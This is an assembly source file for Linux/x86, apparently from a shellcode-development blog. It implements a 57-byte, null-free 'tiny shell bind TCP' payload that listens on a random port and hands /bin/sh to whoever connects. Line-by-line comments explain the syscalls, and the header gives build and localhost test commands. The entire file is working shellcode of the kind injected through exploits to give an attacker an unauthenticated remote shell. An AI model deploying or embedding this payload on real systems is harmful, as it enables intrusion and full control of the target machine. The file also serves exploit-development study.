; Tiny Shell Bind TCP Random Port - Assembly Language - Linux/x86
; Copyright (C) 2013 Geyslan G. Bem, Hacking bits
;
;   http://hackingbits.com
;   geyslan@gmail.com
;
; This program is free software: you can redistribute it and/or modify
; it under the terms of the GNU General Public License as published by
; the Free Software Foundation, either version 3 of the License, or
; (at your option) any later version.
;
; This program is distributed in the hope that it will be useful,
; but WITHOUT ANY WARRANTY; without even the implied warranty of
; MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
; GNU General Public License for more details.
;
; You should have received a copy of the GNU General Public License
; along with this program.  If not, see <http://www.gnu.org/licenses/>.


;   tiny_shell_bind_tcp_random_port
;
;   * 57 bytes
;   * null-free
;
;
;   # nasm -f elf32 tiny_shell_bind_tcp_random_port.asm
;   # ld -m elf_i386 tiny_shell_bind_tcp_random_port.o -o tiny_shell_bind_tcp_random_port
;
;   Testing
;   # ./tiny_shell_bind_tcp_random_port
;   # netstat -anp | grep shell
;   # nmap -sS 127.0.0.1 -p-  (It's necessary to use the TCP SYN scan option [-sS]; thus avoids that nmap connects to the port open by shellcode)
;   # nc 127.0.0.1 port


global _start

section .text

_start:
	; Avoiding garbage
	; Putting zero in three registers (eax, ebx and edx), search about mul instruction for understanding

	xor ebx, ebx
	mul ebx

	; syscalls (/usr/include/asm/unistd_32.h)
	; socketcall numbers (/usr/include/linux/net.h)

	; Creating the socket file descriptor
	; int socket(int domain, int type, int protocol);
	; socket(AF_INET, SOCK_STREAM, IPPROTO_IP)

	mov al, 102		; syscall 102 - socketcall
	inc ebx			; socketcall type (sys_socket 1)

	; socket arguments (bits/socket.h, netinet/in.h)
	push edx		; IPPROTO_IP = 0 (int)
	push ebx		; SOCK_STREAM = 1 (int)
	push 2			; AF_INET = 2 (int)

	mov ecx, esp		; ptr to argument array

	int 0x80		; kernel interruption


	; Preparing to listen the incoming connection (passive socket)
	; int listen(int sockfd, int backlog);
	; listen(sockfd, int);

	; listen arguments
	push edx		; put zero
	push eax		; put the file descriptor returned by socket()
	mov ecx, esp		; ptr to argument array

	mov al, 102		; syscall 102 - socketcall
	mov bl, 4		; socketcall type (sys_listen 4)

	int 0x80		; kernel interruption


	; Accepting the incoming connection
	; int accept(int sockfd, struct sockaddr *addr, socklen_t *addrlen);
	; accept(sockfd, NULL, NULL)

        mov al, 102		; syscall 102 - socketcall
        inc ebx			; socketcall type (sys_accept 5)

	; accept arguments	; here we just don't need do nothing, the ecx already points to sockfd, NULL and 2
				; you ask me: but the correct isn't sockfd, NULL, NULL? Well, 'man accept' to figure out ;D)

	int 0x80		; kernel interruption


	; Creating a interchangeably copy of the 3 file descriptors (stdin, stdout, stderr)
	; int dup2(int oldfd, int newfd);
	; dup2(clientfd, ...)

	pop ecx			; pop the sockfd integer to use as the loop counter ecx
	xchg ebx, eax		; swapping registers values to put the accepted sockfd (client) in ebx as argument in next syscall (dup2)

dup_loop:
	push 63			; syscall 63 - dup2
	pop eax

	int 0x80		; kernel interruption

	dec ecx			; file descriptor and loop counter

	jns dup_loop


	; Finally, using execve to substitute the actual process with /bin/sh
	; int execve(const char *filename, char *const argv[], char *const envp[]);
	; exevcve("/bin/sh", NULL, NULL)

	mov al, 11		; execve syscall

	; execve string argument
	; stack already contains NULL on top
	push 0x68732f2f		; "//sh"
	push 0x6e69622f		; "/bin"

	mov ebx, esp		; ptr to "/bin//sh" string

	inc ecx			; zero to argv
				; zero to envp (edx)

	int 0x80
